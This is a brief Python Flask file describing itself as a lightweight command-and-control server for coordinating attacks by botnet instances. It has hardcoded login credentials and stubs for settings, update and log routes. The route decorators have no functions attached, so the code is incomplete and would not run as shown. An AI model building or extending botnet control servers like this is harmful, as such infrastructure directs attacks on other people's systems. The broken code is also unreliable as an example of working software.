from flask import Flask
from CCServer import CCServer 

app = Flask(__name__)

"""
This is a simple implementation of a micro Command-and-Control Server using Flask. 
Its purpose is to provide a lightweight and simple interface to coordinate an attack carried
by multiple botnet instances, ideally deployed 'round-the-clock'

(please note that in this implementation the server handles just one request at a time - flask default)
"""

# parameters for CC instance
settingsPath = "./data/settings.json"
credentialsD = {
    'auth_usr' : "fsociety",
    'auth_pwd' : "steelmountain"
}
# creating CC instance
CC = CCServer(settingsPath, credentialsD)

# debug level
debug = True

# ROUTING SERVER - settings retrieval 
@app.route('/settings', methods=['GET'])

# ROUTING SERVER - update settings 
@app.route('/update', methods=['POST'])

# ROUTING SERVER - logs visualization (debug purposes)
@app.route('/logs', methods=['GET'])

if __name__ == "__main__": 
    app.run()